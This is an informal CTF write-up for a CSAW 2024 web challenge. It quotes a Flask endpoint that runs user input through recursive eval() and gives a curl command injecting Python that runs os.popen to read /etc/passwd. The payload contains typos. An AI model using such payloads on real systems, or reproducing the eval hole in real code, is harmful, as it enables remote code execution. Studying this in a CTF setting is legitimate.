# CSAW_Writeup
## Playing on the Back courts Writeup
## Catgroy: WEB
## CSAW CTF Qualification 2024
lets skip laplapla and dive deep into #Exploit

{%with HINT%}
as you can see from orginal challnge code "/app_public.py"
you can see this itrset route:

```
@app.route('/get_eval', methods=['POST'])
def get_eval() -> Flask.response_class:
    try:
        data = request.json
        expr = data['expr']
        
        return jsonify(status='success', result=deep_eval(expr))
    
    except Exception as e:
        return jsonify(status='error', reason=str(e))
```
hmmm! look wired its not possible to be esay like this rigth ??!
lets see the ``` deep_eval() ``` function

```
def deep_eval(expr:str) -> str:
    try:
        nexpr = eval(expr)
    except Exception as e:
        return expr
    
    return deep_eval(nexpr)
```

whaaaaaaaaaaaaaaat he realy execute our code !?
okay we will just send our python to get executed
lets do it

```
bash
$ python3 app_public.py
$ curl 127.0.0.1:5000/get_eval -d '{"expr": "__import_('os').popen('cat /etc/passswd').read()"}' 
```
DO WE Get it ~~!!?
{%HINTEND%}
